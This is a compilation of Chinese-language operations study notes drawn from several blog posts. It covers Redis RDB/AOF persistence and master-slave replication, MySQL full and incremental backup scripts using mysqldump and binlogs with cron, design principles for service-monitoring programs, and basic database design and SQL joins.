dir /data/6379  # 定义持久化文件存储位置(rdb和aof)

dbfilename  dbmp.rdb  # rdb持久化文件
save 900 1  # rdb机制 每900秒 如果至少有1个key发生变化，则dump内存快照(相当于手动save触发rdb持久化文件)
save 300 10 # 在300秒(5分钟)之后，如果至少有10个key发生变化，则dump内存快照。
save 60 10000  # 在60秒(1分钟)之后，如果至少有10000个key发生变化，则dump内存快照。

2.触发rdb持久化，可以手动save命令,生成 dump.rdb持久化文件

3.重启redis，数据不再丢失

4. 测试
进入redis客户端
redis-cli

127.0.0.1:6379> set age 18
OK
127.0.0.1:6379> save
OK

5.进入/data/6379查看是否生成了 dbmp.rdb 持久化文件
注意：rdb数据文件是二进制文件，人为的看不懂

6.kill掉redis进程，再重启，进入redis   keys * 查看数据是否还在
复制代码
复制代码
 

2、redis持久化之aof
AOF（append-only log file）
记录服务器执行的所有变更操作命令（例如set del等），并在服务器启动时，通过重新执行这些命令来还原数据集


AOF 文件中的命令全部以redis协议的格式保存，新命令追加到文件末尾。
优点：最大程序保证数据不丢
缺点：日志记录非常大

 

1. 配置方式

 

复制代码
复制代码
1,在配置文件中，添加aof参数
参数解释：
appendonly yes  # 开启aof功能

# appendfsync选择一个策略写入配置文件即可，这里使用每分钟
appendfsync everysec # 每秒钟同步一次，该策略为AOF的缺省策略。
appendfsync always   # 每次有数据修改发生时都会写入AOF文件。
appendfsync no       # 从不同步。高效但是数据不会被持久化

配置如下：
port 6379
daemonize yes
pidfile /data/6379/redis.pid
loglevel notice
logfile "/data/6379/redis.log"
protected-mode yes
dir /data/6379
dbfilename  dbmp.rdb
save 900 1
save 300 10
save 60 10000

appendonly yes
appendfsync everysec


2,重启redis数据库，加载aof功能
会在/data/6379目录下生成 appendonly.aof 文件


3,appendonly.aof 文件是人可以看懂的记录了sql操作的文件

4,测试
进入redis客户端
redis-cli

127.0.0.1:6379> set long 18
OK

5,进入/data/6379查看appendonly.aof 文件的内容

6,kill掉redis进程，再重启，进入redis   keys * 查看数据是否还在
复制代码
复制代码
 

 

3、在不重启redis的情况下，切换rdb数据到aof数据中
 

复制代码
复制代码
1.配置redis支持rdb持久化

2.启动redis客户端，通过命令，临时切换到aof模式
127.0.0.1:6379> CONFIG set appendonly yes  # 开启AOF功能
OK
127.0.0.1:6379> CONFIG SET save ""  # 关闭RDB功能
OK

3.检查此时的数据持久化方式是rdb，还是aof，检查appendonly.aof文件，数据变动
tail -f appendonly.aof

4.此时aof还未永久生效，写入参数到配置文件
编辑redis-6379.conf 添加如下参数
appendonly yes
appendfsync everysec
复制代码
复制代码
 

4、redis持久化方式有什么区别
rdb：基于快照的持久化，速度更快，一般用作备份，主从复制也是依赖于rdb持久化功能

aof：以追加的方式记录redis操作日志的文件。可以最大程度的保证redis数据安全，类似于mysql的binlog

 

六、redis主从同步实现
原理：
1. 从服务器向主服务器发送 SYNC 命令。
2. 接到 SYNC 命令的主服务器会调用BGSAVE 命令，创建一个 RDB 文件，并使用缓冲区记录接下来执行的所有写命令。
3. 当主服务器执行完 BGSAVE 命令时，它会向从服务器发送 RDB 文件，而从服务器则会接收并载入这个文件。
4. 主服务器将缓冲区储存的所有写命令发送给从服务器执行。

小知识：
1. 在开启主从复制的时候，使用的是RDB方式的，同步主从数据的
2. 同步开始之后，通过主库命令传播的方式，主动的复制方式实现
3. 2.8以后实现PSYNC的机制，实现断线重连

 

1、使用配置文件进行redis主从同步配置
准备三个redis数据库,redis支持多实例
三个配置文件，仅仅是端口的不同

在三个配置文件中，添加主从同步的参数,
三个配置文件参数是一样的，唯一不同的是，
在从库中需要指定它的主库是谁即可，
例如6380的配置
slaveof 127.0.0.1 6379 代表这个redis库是6379的从库

 

复制代码
复制代码
1. 三个配置文件参信息如下
# redis-6379.conf(主redis)
port 6379           
daemonize yes           
pidfile /data/6379/redis.pid
loglevel notice        
logfile "/data/6379/redis.log"
dir /data/6379            
protected-mode yes 
dbfilename  dbmp.rdb
save 900 1
save 300 10 
save 60 10000


# redis-6380.conf(从redis)
port 6380           
daemonize yes           
pidfile /data/6380/redis.pid
loglevel notice        
logfile "/data/6380/redis.log"
dir /data/6380            
protected-mode yes 
dbfilename  dbmp.rdb
save 900 1
save 300 10 
save 60 10000
slaveof  127.0.0.1 6379


# redis-6381.conf(从redis)
port 6381           
daemonize yes           
pidfile /data/6381/redis.pid
loglevel notice        
logfile "/data/6381/redis.log"
dir /data/6381            
protected-mode yes 
dbfilename  dbmp.rdb
save 900 1
save 300 10 
save 60 10000
slaveof  127.0.0.1 6379


2.启动三个redis实例
redis-server redis-6379.conf
redis-server redis-6380.conf
redis-server redis-6381.conf

3.查看主从同步身份
1,redis-cli -p 6379  info replication 
# Replication
role:master
connected_slaves:2
slave0:ip=127.0.0.1,port=6380,state=online,offset=28,lag=1
slave1:ip=127.0.0.1,port=6381,state=online,offset=28,lag=1


2,redis-cli -p 6380  info replication 
# Replication
role:slave
master_host:127.0.0.1
master_port:6379


3,redis-cli -p 6381  info replication 
# Replication
role:slave
master_host:127.0.0.1
master_port:6379

4.测试
# 在6379主库
redis-cli -p 6379

127.0.0.1:6379> set uzi good
OK

# 在6380从库
redis-cli -p 6380

127.0.0.1:6380> get uzi
"good"

# 在6381从库
redis-cli -p 6381

127.0.0.1:6381> get uzi
"good"
复制代码
复制代码
 

2、使用命令行进行redis主从同步配置
复制代码
复制代码
1. 6380/6381命令行
redis-cli -p 6380
127.0.0.1:6380> SLAVEOF 127.0.0.1 6379  #指明主库的地址

redis-cli -p 6381
127.0.0.1:6381> SLAVEOF 127.0.0.1 6379  #指明主库的地址


2. 检查主从状态
主库：
127.0.0.1:6379> info replication

从库：
127.0.0.1:6380> info replication
127.0.0.1:6381> info replication
复制代码
复制代码
 

3、如果我主库挂了怎么办
复制代码
复制代码
解决方案：手动切换主从身份，选举一个新的主库
1.干掉6379主库
redis-cli -p 6379 shutdown

2.在6380上关闭自己的slave身份
127.0.0.1:6380> slaveof no one 

3.在6381上给与新的主人身份
127.0.0.1:6381> salveof  127.0.0.1  6380 

4.修改完毕，还得修改配置文件，永久生效

```

### 数据冗余、备份（MySQL增量、全量 原理）
```
https://www.cnblogs.com/abeli/p/6725201.html
在日常运维工作中，对mysql数据库的备份是万分重要的，以防在数据库表丢失或损坏情况出现，可以及时恢复数据。

下面对这种备份方案详细说明下：
1.MySQLdump增量备份配置
执行增量备份的前提条件是MySQL打开binlog日志功能，在my.cnf中加入
log-bin=/opt/Data/MySQL-bin
“log-bin=”后的字符串为日志记载目录，一般建议放在不同于MySQL数据目录的磁盘上。

 

　　mysqldump >       导出数据
 

　　mysql <           导入数据  （或者使用source命令导入数据，导入前要先切换到对应库下）
 

 

注意一个细节：
 

若是mysqldump导出一个库的数据，导出文件为a.sql，然后mysql导入这个数据到新的空库下。
 

如果新库名和老库名不一致，那么需要将a.sql文件里的老库名改为新库名，
 

这样才能顺利使用mysql命令导入数据（如果使用source命令导入就不需要修改a.sql文件了）。
2.MySQLdump增量备份
假定星期日下午1点执行全量备份，适用于MyISAM存储引擎。
[root@test-huanqiu ~]# MySQLdump --lock-all-tables --flush-logs --master-data=2 -u root -p test > backup_sunday_1_PM.sql

对于InnoDB将--lock-all-tables替换为--single-transaction
--flush-logs为结束当前日志，生成新日志文件；
--master-data=2 选项将会在输出SQL中记录下完全备份后新日志文件的名称，

用于日后恢复时参考，例如输出的备份SQL文件中含有：
CHANGE MASTER TO MASTER_LOG_FILE=’MySQL-bin.000002′, MASTER_LOG_POS=106;

3.MySQLdump增量备份其他说明：
如果MySQLdump加上–delete-master-logs 则清除以前的日志，以释放空间。但是如果服务器配置为镜像的复制主服务器，用MySQLdump –delete-master-logs删掉MySQL二进制日志很危险，因为从服务器可能还没有完全处理该二进制日志的内容。在这种情况下，使用 PURGE MASTER LOGS更为安全。

每日定时使用 MySQLadmin flush-logs来创建新日志，并结束前一日志写入过程。并把前一日志备份，例如上例中开始保存数据目录下的日志文件 MySQL-bin.000002 , ...

1.恢复完全备份
mysql -u root -p < backup_sunday_1_PM.sql

2.恢复增量备份
mysqlbinlog MySQL-bin.000002 … | MySQL -u root -p注意此次恢复过程亦会写入日志文件，如果数据量很大，建议先关闭日志功能

--compatible=name
它告诉 MySQLdump，导出的数据将和哪种数据库或哪个旧版本的 MySQL 服务器相兼容。值可以为 ansi、MySQL323、MySQL40、postgresql、oracle、mssql、db2、maxdb、no_key_options、no_tables_options、no_field_options 等，要使用几个值，用逗号将它们隔开。当然了，它并不保证能完全兼容，而是尽量兼容。

--complete-insert，-c
导出的数据采用包含字段名的完整 INSERT 方式，也就是把所有的值都写在一行。这么做能提高插入效率，但是可能会受到 max_allowed_packet 参数的影响而导致插入失败。因此，需要谨慎使用该参数，至少我不推荐。

--default-character-set=charset
指定导出数据时采用何种字符集，如果数据表不是采用默认的 latin1 字符集的话，那么导出时必须指定该选项，否则再次导入数据后将产生乱码问题。

--disable-keys
告诉 MySQLdump 在 INSERT 语句的开头和结尾增加 /*!40000 ALTER TABLE table DISABLE KEYS */; 和 /*!40000 ALTER TABLE table ENABLE KEYS */; 语句，这能大大提高插入语句的速度，因为它是在插入完所有数据后才重建索引的。该选项只适合 MyISAM 表。

--extended-insert = true|false
默认情况下，MySQLdump 开启 --complete-insert 模式，因此不想用它的的话，就使用本选项，设定它的值为 false 即可。

--hex-blob
使用十六进制格式导出二进制字符串字段。如果有二进制数据就必须使用本选项。影响到的字段类型有 BINARY、VARBINARY、BLOB。

--lock-all-tables，-x
在开始导出之前，提交请求锁定所有数据库中的所有表，以保证数据的一致性。这是一个全局读锁，并且自动关闭 --single-transaction 和 --lock-tables 选项。

--lock-tables
它和 --lock-all-tables 类似，不过是锁定当前导出的数据表，而不是一下子锁定全部库下的表。本选项只适用于 MyISAM 表，如果是 Innodb 表可以用 --single-transaction 选项。

--no-create-info，-t
只导出数据，而不添加 CREATE TABLE 语句。

--no-data，-d
不导出任何数据，只导出数据库表结构。
mysqldump --no-data --databases mydatabase1 mydatabase2 mydatabase3 > test.dump
将只备份表结构。--databases指示主机上要备份的数据库。

--opt
这只是一个快捷选项，等同于同时添加 --add-drop-tables --add-locking --create-option --disable-keys --extended-insert --lock-tables --quick --set-charset 选项。本选项能让 MySQLdump 很快的导出数据，并且导出的数据能很快导回。该选项默认开启，但可以用 --skip-opt 禁用。注意，如果运行 MySQLdump 没有指定 --quick 或 --opt 选项，则会将整个结果集放在内存中。如果导出大数据库的话可能会出现问题。

--quick，-q
该选项在导出大表时很有用，它强制 MySQLdump 从服务器查询取得记录直接输出而不是取得所有记录后将它们缓存到内存中。

--routines，-R
导出存储过程以及自定义函数。

--single-transaction
该选项在导出数据之前提交一个 BEGIN SQL语句，BEGIN 不会阻塞任何应用程序且能保证导出时数据库的一致性状态。它只适用于事务表，例如 InnoDB 和 BDB。本选项和 --lock-tables 选项是互斥的，因为 LOCK TABLES 会使任何挂起的事务隐含提交。要想导出大表的话，应结合使用 --quick 选项。

--triggers
同时导出触发器。该选项默认启用，用 --skip-triggers 禁用它。

跨主机备份
使用下面的命令可以将host1上的sourceDb复制到host2的targetDb，前提是host2主机上已经创建targetDb数据库：
-C 指示主机间的数据传输使用数据压缩
mysqldump --host=host1 --opt sourceDb| mysql --host=host2 -C targetDb

结合Linux的cron命令实现定时备份
比如需要在每天凌晨1:30备份某个主机上的所有数据库并压缩dump文件为gz格式
30 1 * * * mysqldump -u root -pPASSWORD --all-databases | gzip > /mnt/disk2/database_`date '+%m-%d-%Y'`.sql.gz

一个完整的Shell脚本备份MySQL数据库示例。比如备份数据库opspc
[root@test-huanqiu ~]# vim /root/backup.sh
#!bin/bash
echo "Begin backup mysql database"
mysqldump -u root -ppassword opspc > /home/backup/mysqlbackup-`date +%Y-%m-%d`.sql
echo "Your database backup successfully completed"

[root@test-huanqiu ~]# crontab -e
30 1 * * * /bin/bash -x /root/backup.sh > /dev/null 2>&1

mysqldump全量备份+mysqlbinlog二进制日志增量备份
1）从mysqldump备份文件恢复数据会丢失掉从备份点开始的更新数据，所以还需要结合mysqlbinlog二进制日志增量备份。
首先确保已开启binlog日志功能。在my.cnf中包含下面的配置以启用二进制日志：
[mysqld]
log-bin=mysql-bin

2）mysqldump命令必须带上--flush-logs选项以生成新的二进制日志文件：
mysqldump --single-transaction --flush-logs --master-data=2 > backup.sql
其中参数--master-data=[0|1|2]
0: 不记录
1：记录为CHANGE MASTER语句
2：记录为注释的CHANGE MASTER语句

mysqldump全量+增量备份方案的具体操作可参考下面两篇文档：
数据库误删除后的数据恢复操作说明
解说mysql之binlog日志以及利用binlog日志恢复数据

 

下面分享一下自己用过的mysqldump全量和增量备份脚本

 

应用场景：
1）增量备份在周一到周六凌晨3点，会复制mysql-bin.00000*到指定目录；
2）全量备份则使用mysqldump将所有的数据库导出，每周日凌晨3点执行，并会删除上周留下的mysq-bin.00000*，然后对mysql的备份操作会保留在bak.log文件中。

脚本实现：
1）全量备份脚本（假设mysql登录密码为123456；注意脚本中的命令路径）：

[root@test-huanqiu ~]# vim /root/Mysql-FullyBak.sh
#!/bin/bash
# Program
# use mysqldump to Fully backup mysql data per week!
# History
# Path
BakDir=/home/mysql/backup
LogFile=/home/mysql/backup/bak.log
Date=`date +%Y%m%d`
Begin=`date +"%Y年%m月%d日 %H:%M:%S"`
cd $BakDir
DumpFile=$Date.sql
GZDumpFile=$Date.sql.tgz
/usr/local/mysql/bin/mysqldump -uroot -p123456 --quick --events --all-databases --flush-logs --delete-master-logs --single-transaction > $DumpFile
/bin/tar -zvcf $GZDumpFile $DumpFile
/bin/rm $DumpFile
Last=`date +"%Y年%m月%d日 %H:%M:%S"`
echo 开始:$Begin 结束:$Last $GZDumpFile succ >> $LogFile
cd $BakDir/daily
/bin/rm -f *

2）增量备份脚本（脚本中mysql的数据存放路径是/home/mysql/data，具体根据自己的实际情况进行调整）
[root@test-huanqiu ~]# vim /root/Mysql-DailyBak.sh
#!/bin/bash
# Program
# use cp to backup mysql data everyday!
# History
# Path
BakDir=/home/mysql/backup/daily                     //增量备份时复制mysql-bin.00000*的目标目录，提前手动创建这个目录
BinDir=/home/mysql/data                                   //mysql的数据目录
LogFile=/home/mysql/backup/bak.log
BinFile=/home/mysql/data/mysql-bin.index           //mysql的index文件路径，放在数据目录下的
/usr/local/mysql/bin/mysqladmin -uroot -p123456 flush-logs
#这个是用于产生新的mysql-bin.00000*文件
Counter=`wc -l $BinFile |awk '{print $1}'`
NextNum=0
#这个for循环用于比对$Counter,$NextNum这两个值来确定文件是不是存在或最新的
for file in `cat $BinFile`
do
    base=`basename $file`
    #basename用于截取mysql-bin.00000*文件名，去掉./mysql-bin.000005前面的./
    NextNum=`expr $NextNum + 1`
    if [ $NextNum -eq $Counter ]
    then
        echo $base skip! >> $LogFile
    else
        dest=$BakDir/$base
        if(test -e $dest)
        #test -e用于检测目标文件是否存在，存在就写exist!到$LogFile去
        then
            echo $base exist! >> $LogFile
        else
            cp $BinDir/$base $BakDir
            echo $base copying >> $LogFile
         fi
     fi
done
echo `date +"%Y年%m月%d日 %H:%M:%S"` $Next Bakup succ! >> $LogFile

3）设置crontab任务，执行备份脚本。先执行的是增量备份脚本，然后执行的是全量备份脚本：
[root@test-huanqiu ~]# crontab -e
#每个星期日凌晨3:00执行完全备份脚本
0 3 * * 0 /bin/bash -x /root/Mysql-FullyBak.sh >/dev/null 2>&1
#周一到周六凌晨3:00做增量备份
0 3 * * 1-6 /bin/bash -x /root/Mysql-DailyBak.sh >/dev/null 2>&1

4）手动执行上面两个脚本，测试下备份效果
[root@test-huanqiu backup]# pwd
/home/mysql/backup
[root@test-huanqiu backup]# mkdir daily
[root@test-huanqiu backup]# ll
total 4
drwxr-xr-x. 2 root root 4096 Nov 29 11:29 daily
[root@test-huanqiu backup]# ll daily/
total 0

先执行增量备份脚本
[root@test-huanqiu backup]# sh /root/Mysql-DailyBak.sh
[root@test-huanqiu backup]# ll
total 8
-rw-r--r--. 1 root root 121 Nov 29 11:29 bak.log
drwxr-xr-x. 2 root root 4096 Nov 29 11:29 daily
[root@test-huanqiu backup]# ll daily/
total 8
-rw-r-----. 1 root root 152 Nov 29 11:29 mysql-binlog.000030
-rw-r-----. 1 root root 152 Nov 29 11:29 mysql-binlog.000031
[root@test-huanqiu backup]# cat bak.log
mysql-binlog.000030 copying
mysql-binlog.000031 copying
mysql-binlog.000032 skip!
2016年11月29日 11:29:32 Bakup succ!

然后执行全量备份脚本
[root@test-huanqiu backup]# sh /root/Mysql-FullyBak.sh
20161129.sql
[root@test-huanqiu backup]# ll
total 152
-rw-r--r--. 1 root root 145742 Nov 29 11:30 20161129.sql.tgz
-rw-r--r--. 1 root root 211 Nov 29 11:30 bak.log
drwxr-xr-x. 2 root root 4096 Nov 29 11:30 daily
[root@test-huanqiu backup]# ll daily/
total 0
[root@test-huanqiu backup]# cat bak.log
mysql-binlog.000030 copying
mysql-binlog.000031 copying
mysql-binlog.000032 skip!
2016年11月29日 11:29:32 Bakup succ!
开始:2016年11月29日 11:30:38 结束:2016年11月29日 11:30:38 20161129.sql.tgz succ

```

### 监控检查（分存活、服务可用两个维度）
```
https://zhuanlan.zhihu.com/p/27437421
1. 背景
此处所说的服务监控程序，是指通过模拟用户的请求，对一个系统的服务质量进行监控的程序。服务监控程序的主要目的是：从用户的角度，通过发送端到端的请求，确认系统对外提供的服务是否正常。

简单来说，一个好的服务监控程序应该具备以下功能：

检测服务是否存活
检测服务质量是否正常
检测服务质量的变化趋势
对每日的监控数据做统计报表
运维友好的
……
需要首先说明的是，监控一个系统服务是否正常是一个全方位的工作，需要进行如进程监控、请求错误率监控、网络流量监控，日志监控等工作。然而服务监控程序通常有着不可替代的作用，例如，通过将服务监控程序部署在用户的机器上，就可以从用户的角度对系统的服务质量进行监控，包括请求响应时间，请求错误率等等。

本文接下来首先分析在开发一个服务监控程序时需要考虑的方方面面，接着介绍在部署和运维一个服务监控程序的时候需要注意的问题。

2. 监控目标
要实现一个服务监控程序，首先需要明确要对服务可能出现的哪些异常情况进行监控，以下列举了一些可能出现的服务异常：

Dead – 服务已经挂掉（如进程异常退出，系统异常重启等）
Unreachable – 服务不可达（如DNS异常，网络中断等）
Unresponsive – 请求可以正常发送，但是服务无响应（如服务器内部异常等）
Slow – 服务可以正确响应，但是响应时间过长（如服务器过载等）
Wrong – 服务可以及时响应，但是结果不符合预期（如服务器内部数据库异常等）
……（以下还有很多异常）
对于以上的一些错误，如服务进程异常退出等，可以通过进程监控等及时发现。然而对于服务不可达，或者服务响应时间变长等，通常服务内部的监控并不能及时发现，此时就需要依赖服务监控程序。

部署服务监控程序的一个重要目标，就是当由于系统内部的错误、或者系统外部依赖的环境的异常导致用户的请求受到影响时，可以在短时间（1分钟）发现并及时处理。

同时，通过及时分析服务监控程序的请求记录，也可以对系统可能出现的瓶颈及时预警。举例来说：当服务监控程序的请求响应时间逐渐变长时，则说明系统可能需要扩容了。

3. 服务监控程序的实现
实现一个服务监控程序相对容易：只要模拟用户的请求发送到服务器，当请求超时或失败时则进行报警通知管理员即可。然而要实现一个好的监控程序，达到报警及时、准确——出问题时马上报警，不出问题不误报警，并不是一件容易的事情。

以下介绍实现一个好的服务监控程序时需要注意的一些问题。

3.1. 服务监控程序对系统的影响要尽量小

服务监控程序对被监控系统的影响要尽量小，被监控系统不能为了因为处理服务监控程序的探测请求而消耗太多资源，这里的资源包括：网络资源、计算资源、存储资源等。

举例来说，我们的对象存储服务对用户提供了以下功能：

用户可以向自己的存储空间中上传和下载对象
用户可以对一个图片对象进行图片处理相关操作（如裁剪，给图片加水印等）
用户可以对一个视频对象进行视频处理相关操作（如截取视频帧，视频转码等）
还提供了其他一些操作，如List自己存储空间中的对象，批量删除对象等操作
我们的每一种服务都由一个相对独立的集群提供：

上传下载服务有数据库和存储集群
图片处理服务有图片处理集群
视频处理服务有视频处理集群
我们的服务监控程序在实现时有以下考虑：

为了检测服务上传下载服务，需要模拟用户发送对象上传下载请求。这里要注意的是，上传下载的对象不能太大，原因有两个：一是服务器处理逻辑对于大对象和小对象是一样的；二是避免因为上传或下载一个大对象出现的网络波动或磁盘负载抖动。

为了检测图片处理服务，只需要对一个小图片进行最简单的图片处理即可。避免对一个大图片进行过于复杂的图片处理带来的CPU消耗。

为了检测视频处理服务，只需要发送对一个小视频截取第一帧的请求即可。如果截取一个大视频的任意帧，程序可能需要将整个视频全部读到本地才能完成，这会带来巨大的网络和磁盘开销。

我们实现的服务监控程序不会执行一些复杂的操作，如批量删除对象等。原因是批量删除对象实际上最终是调用删除单个对象的接口，而我们会在检测上传下载服务中对删除对象的接口进行调用（上传 -> 下载 -> 删除）。

这里所要强调的是：在写服务监控程序的时候，要明确需要如何监控自己的系统，并且用最小的代价来进行探测。

3.2. 及时发现系统异常

服务监控程序周期性地向被监控系统发送探测请求，为了能及时发现系统异常，这个探测周期就需要设置的足够小。然而若探测周期设置的过小，必然对被监控系统的影响会提高。因此需要根据被监控系统的具体情况来设定该周期。

例如对于我们的对象存储来说，文件读写是核心服务，而图片和视频处理是附加服务。因此对于核心的上传下载服务，探测周期均为1分钟一次，而图片和视频则可以将周期设置为5分钟。

这里所要强调的是：为了设置合理的探测周期，要能够对被监控系统的重要程度进行区分，根据不同的重要性来设置不同的探测周期。当然，如果探测请求对系统的影响很小，那么所有的探测请求设置的足够频繁也没有问题。

3.3. 精确报警

所谓精确报警，就是做到“系统正常不报警，系统异常必报警”，做到了这一点，那一旦运维人员收到相关的报警，则需要将该报警作为第一优先级立即进行处理。

此处有一个问题需要注意：即系统偶尔的小抖动（如网络丢包，或者系统偶尔负载提高导致响应时间变长等），不应该发送报警，而只需要记入日志并在次日发送邮件给运维人员即可。这就需要在开发服务监控程序时考虑相关的处理逻辑。

以下给出我们的服务监控程序探测上传下载服务的相关处理逻辑：

每分钟发送1次上传、下载、删除请求，判断请求返回值是否符合预期，同时记录每次请求的响应时间；
如果请求的返回值符合预期，且响应时间没有超过设置的阈值，则等待一分钟再次发送请求；否则，将错误信息记入日志，并执行第3步；
连续发送5次请求，并判断这5次请求的返回结果和执行时间。如果超过2次请求出错或超时，则发送报警，否则只记日志不发送报警。
该处理逻辑中所有的次数（包括发送请求次数，报警阈值等）均可以在配置文件中设置，保证运维人员可以根据实际情况配置合理的值。这种实现方式，可以有效防止偶发的错误造成的误报警。当然，对于那些出错的请求，需要好好进行分析。

3.4. 全面监控子系统

通常，一个服务由一个集群来提供，前端通过Openresty的负载均衡来将用户请求分发到该集群的各个工作节点。这里可能会出现的一个问题是：当一个工作节点出现异常时，前端用户的请求可能不会受到影响，然而系统的运维人员一定需要知道该信息。

我们的做法是，在给各个工作节点配置如进程监控，日志监控等常规监控的基础上，通过部署在内部某节点的服务监控程序将请求直接发送到该工作节点上，用于监控该节点的服务质量。

我们的服务监控程序同时监控了对象存储服务的外部域名、内部域名、前端Openresty的虚拟IP、真实IP，各个服务子节点的服务端口等。

3.5. 服务监控程序的监控

服务监控程序监控系统运行状况，然而作为一个服务本身，它的状态也应该被监控起来。否则，如果服务监控程序本身已经异常退出，则无法在系统故障时及时报警。

服务监控程序的监控需要从开发和运维两个方面进行保障，在这里先谈谈开发时需要考虑的因素：

要考虑运维误操作可能会kill掉服务监控程序，因此程序中需要捕获kill信号并发送报警或输出一条FATAL级别日志（用于日志监控）；
服务监控程序可以考虑提供HTTP访问接口，供外部程序监控服务监控程序的状态。当系统部署多套服务监控程序时，也可以利用该接口查看各个服务监控程序所在机器的服务质量；
……
3.6. 多重报警机制

当服务监控程序可以及时、精确发现服务异常时，需要通过短信报警（或邮件等其他报警）将问题告诉给系统运维人员。在开发时需要考虑服务监控程序需要提供至少两套报警机制，防止其中一种报警方式失灵的情况。

举例来说，服务监控程序至少可以采用以下几种方式进行报警：

直接调用公共的报警短信接口（如运维平台提供的Http接口）发送报警；
通过记录错误日志，进行日志监控，当日志中出现特定关键字时进行报警；
将监控的数据推送到统一的监控平台，在监控平台中实现逻辑判断和报警发送
3.7. 其他若干注意事项

以下再列举一些其他在开发服务监控程序时的注意事项：

报警信息要准确
发送报警信息很重要的一方面在于帮助开发和运维尽快定位问题，因此报警信息一定要准确。下面是一些推荐的报警信息：
“192.168.0.1上对象读写监控程序连续5次请求超时”
“10.10.0.138上的视频截图服务出现错误，错误信息为：...”
可以对配置文件进行动态reload
例如，如果服务监控程序有一个配置文件：hosts.conf，表示该监控程序需要探测的所有服务器地址。那当该配置文件修改时，程序可以在下次探测时去探测新加入的地址。这样减少了运维关闭服务监控程序和重启的操作，也就减小了出错的风险。
服务监控程序的重试
我们之前实现的服务监控程序，内部采用Java-SDK中提供的PutObject函数和GetObject等函数。这些函数在某些错误的情况下会进行重试，而这个重试很有可能导致屏蔽了某种可能的系统异常。
服务监控程序的日志
服务监控程序的日志也应该按照生产系统的标准，输出操作日志和错误日志等，规范的日志可以大大加速错误定位过程。
防止服务监控程序导致系统过载
在系统已经过载的情况下，请求可能被拒绝或超时。此时，当服务监控程序判断系统已经过载时，则发送报警。同时应该暂停（如暂停10分钟）向服务器发送探测请求，减轻系统负担。
将所有服务的监控都放在一个程序中
我们将所有服务的监控（上传下载、图片处理、视频处理）都集成在一套代码中，通过配置文件可以分别对各类监控进行配置。这样做的好处是：代码维护和运维成本低，因为只需要维护一套代码，部署一套代码即可。然而需要注意的是，所有的监控都部署在一台机器上，可能导致该机器的占用较多的带宽，因此需要特别注意采样数据不能太大。
服务监控程序的代码应该纳入版本管理
需要把服务监控程序作为整个系统的一个重要部分，进行代码的管理。
4. 服务监控程序的部署与运维
开发服务监控程序只走完了长征路的第一步，而剩下的两万五千里路都依赖服务的部署和运维。

以下介绍部署和运维服务监控程序的注意事项。

4.1. 多点部署

将服务监控程序进行多点部署至少有两个方面的目的：

服务监控程序的高可用——防止一台服务监控程序挂掉的情况
从用户角度监控服务——通过将服务监控程序部署在用户的服务器上，可以从用户的角度监控服务质量
多点部署也有以下问题需要注意：

服务监控程序必须能够支持多点部署，因此在开发的时候需要注意多个服务监控程序不能相互干扰；
部署在用户服务器上的监控程序要占用尽量少的资源，避免对用户本身的系统产生影响，在部署时也可以通过配置若干参数：如探测周期、探测请求数量等，降低服务监控程序占用资源；
4.2. 报警阈值调节

在开发服务监控程序时，需要尽量将所有的参数做成可配置参数，同时可以动态reload，如:

要监控哪些服务器
要监控哪类操作
监控周期是多少
每个监控周期发送多少请求
请求超时时间是多少
一次请求出错后要连续发送多少请求
报警接收人信息
……
而运维人员的工作是，需要根据被检测系统的实际情况设置这些参数，并且调节这些参数为一个合理的值。

参数调节应该遵循“先紧后松”的原则，即开始是可以将报警阈值设置的敏感一些，然后去分析每次报警，如果确认是误报，再将报警阈值调高一点。同时，及时不报警，也应该及时分析系统的错误日志，确保没有报警遗漏。

4.3. 报警可用性检查

所谓报警可用性检查，就是运维人员需要定期对服务监控程序的报警逻辑进行验证，确保这些报警都能正确发出并被相关人员接收。

验证报警可用性并不是一件容易的事情，因为有时候可能需要主动触发一些错误逻辑，这会使该验证过程耗时费力。因此在开发服务监控程序时，需要考虑如何给运维提供方便的可用性验证接口。

例如，可以在配置文件中设置一个字段testAlarm，当该字段设为true时，服务监控程序主动触发一些错误，例如对一个文本文件进行图片缩略操作，或者下载对象时指定一个错误的文件名等，这样便可以很方便的触发一次报警，用于验证报警可用性。

4.4. 报警处理

当接收到一条报警时，运维人员应该有相对应的报警处理流程，哪怕该流程是“执行ping操作验证网络是否联通，并通知服务监控程序所在服务器的相关产品方”。

有很多的文章强调报警必须要Actionable，即可被处理的报警。运维和开发需要一起确认哪些错误应该发送报警，而哪些错误只要计入日志或在次日邮件报表通知即可。如果在收到一条报警而无事可做，那设置该报警的意义不大。

4.5. 其他若干注意事项

以下再列举一些部署和运维服务监控程序时的注意事项：

任何一个报警，需要发给至少两个相关人员，且有一个主要负责人员
发给至少两个人，是为了确保报警不会被遗漏；而发给相关人员，是为了防止非相关人员因为经常收到与自己无关的报警短信而忽略了发给自己的重要报警短信。
服务监控程序的上线流程
服务监控程序也需要执行完整的从开发到测试到部署上线的流程。尽管服务监控程序只是一个外部程序，然而我们通常会在内网部署让它可以将请求直接发送到后端各个子节点，因此也存在一定的风险，顾需要严格按照上线流程执行。

```

### MySQL、Redis、Memcached Proxy 、Cluster 目的、原理
```
https://www.cnblogs.com/hnlmy/p/9997515.html
数据库
数据库设计
 a. 单表
 b. FK（单表；一张表存储时，如果有重复出现的字段为了防止硬盘的浪费，所以做一个FK；去掉FK变成单表（这样子访问速度快了））
 c. M2M（多对多关系）
    
 到底是什么关系？
        单选的下拉框/radio FK；多选下拉框/checkbox M2M    
举个小例子：

复制代码
问题：员工信息表员工当前薪资；保留员工的所有的调薪记录。
思路一：两张表
            员工表：
                id  name salary 
                
            调薪：
                id  price  time  员工ID 
                  
思路二：三张表
             员工表：
                id  name salary 
                
             调薪：
                id  price  time 
                
                
            员工调薪表：
                id   uid   sid
复制代码
基本SQL
分组(group by)
select depart_id,count(1),max(salary),min(age),sum(age) from user group by depart_id
select depart_id,count(1),max(salary),min(age),sum(age) from user group by depart_id having count(1)>5
注意事项：

通过聚合条件group by然后进行筛选的用having不能用where
连表
inner join / left join / right join
inner join是保留两个共有的，如果一个没有就不保留。
left join 是以左表为主表，如果右表没数据，则为null
right join 是以右表为主表，如果左表没数据，则为null
举个小例子：

复制代码
数据：
            部门表：
                id   title 
                1      销售
                2      运营
                3      IT
                
            用户表：
                id          name        部门id
                1           x1          1
                2           x2          1
                3           x3          1
                4           x4          1
                5           x5          1
复制代码
复制代码
     请问查到多少条数据？
            select * from userinfo left join depart on userinfo.did = depart.id    5
        
            select * from depart left join userinfo on userinfo.did = depart.id    7
        
            select * from userinfo inner join depart on userinfo.did = depart.id   5
        
